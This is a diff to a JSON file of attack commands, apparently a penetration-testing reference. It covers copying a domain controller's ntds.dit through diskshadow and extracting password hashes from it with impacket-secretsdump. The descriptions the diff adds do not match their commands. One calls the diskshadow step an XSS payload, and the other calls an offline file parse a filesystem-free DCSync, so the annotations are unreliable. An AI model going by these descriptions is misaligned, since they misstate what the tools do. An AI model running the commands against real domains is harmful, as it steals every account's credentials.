@@ -242,11 +242,13 @@
   "variations": [
     {
       "label": "diskshadow scripted",
-      "command": "diskshadow /s <script_file>   # create shadow, then copy ntds.dit"
+      "command": "diskshadow /s <script_file>   # create shadow, then copy ntds.dit",
+      "description": "Cross-Site Scripting (XSS) payload that executes JavaScript in the victim's browser. Tests for reflected or stored XSS vulnerabilities in the web application."
     },
     {
       "label": "Parse offline",
-      "command": "impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL"
+      "command": "impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL",
+      "description": "Uses Impacket secretsdump to extract NTDS.dit password hashes from a domain controller via DCSync (DRSUAPI). Retrieves all domain account hashes without touching the filesystem - requires DA or replication privileges."
     }
   ],
   "steps": [
